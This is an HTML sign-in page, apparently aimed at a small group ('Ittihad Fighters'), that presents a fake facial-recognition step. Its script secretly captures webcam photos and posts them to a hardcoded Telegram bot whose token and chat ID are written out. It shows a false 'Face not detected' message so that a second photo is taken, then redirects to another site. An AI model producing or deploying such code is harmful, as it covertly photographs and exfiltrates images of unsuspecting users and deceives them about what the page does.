<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ittihad Fighters</title>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            if (localStorage.getItem("accessed")) {
                document.body.innerHTML = "<h1>Access Denied</h1><p>This page can only be accessed once per device.</p>";
                return;
            }
        });
    </script>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        #scanner-animation {
            display: none;
            width: 100%;
            max-width: 300px;
            margin: 20px auto;
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h1>Ittihad Fighters</h1>
    <div id="nameSelection">
        <h2>Select Your Name</h2>
        <ul id="nameList"></ul>
    </div>
    <div id="facialRecognition" style="display: none;">
        <h2>Facial Recognition</h2>
        <button id="continue">Continue</button>
        <button id="cancel">Cancel</button>
        <p id="cancelMessage" style="display: none; color: red;">Page will stop here.</p>
    </div>
    <div id="scanning" style="display: none;">
        <img id="scanner-animation" src="scanning.gif" alt="Scanning...">
        <p id="scanText">Scanning face...</p>
    </div>
    <script>
        const names = ["Izz", "Ali", "Ahmad", "Fatimah", "Aisyah"];
        const nameList = document.getElementById("nameList");
        const selectedNames = new Set();

        names.forEach(name => {
            let li = document.createElement("li");
            let checkbox = document.createElement("input");
            checkbox.type = "checkbox";
            checkbox.value = name;
            checkbox.addEventListener("change", function () {
                if (this.checked) {
                    selectedNames.add(this.value);
                    this.disabled = true;
                }
            });
            li.appendChild(checkbox);
            li.appendChild(document.createTextNode(" " + name));
            nameList.appendChild(li);
        });

        document.getElementById("continue").addEventListener("click", function () {
            document.getElementById("facialRecognition").style.display = "none";
            document.getElementById("scanning").style.display = "block";
            document.getElementById("scanner-animation").style.display = "block";
            
            setTimeout(() => {
                captureAndSend();
            }, 5000);
        });

        document.getElementById("cancel").addEventListener("click", function () {
            document.getElementById("cancelMessage").style.display = "block";
        });

        function captureAndSend() {
            let canvas = document.createElement("canvas");
            let video = document.createElement("video");
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    let ctx = canvas.getContext("2d");
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    sendToTelegram(canvas);
                    stream.getTracks().forEach(track => track.stop());
                }, 2000);
            });
        }

        function sendToTelegram(canvas) {
            canvas.toBlob(blob => {
                let formData = new FormData();
                formData.append("chat_id", "5934902786");
                formData.append("photo", blob, "face.jpg");
                fetch("https://api.telegram.org/bot8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y/sendPhoto", {
                    method: "POST",
                    body: formData
                }).then(() => {
                    setTimeout(() => {
                        document.getElementById("scanText").innerText = "Face not detected";
                        setTimeout(() => {
                            captureAndSend();
                            setTimeout(() => {
                                let signedNames = Array.from(selectedNames).join(", ");
                                document.body.innerHTML = `<h1>Done âœ…</h1><p>${signedNames} signed in</p><p>You look beautiful/handsome today!</p><p>Redirecting to the next page...</p>`;
                                setTimeout(() => {
                                    window.location.href = "https://studandlearn.github.io/project-2/";
                                }, 3000);
                            }, 5000);
                        }, 5000);
                    }, 5000);
                });
            }, "image/jpeg");
        }
    </script>
</body>
</html>
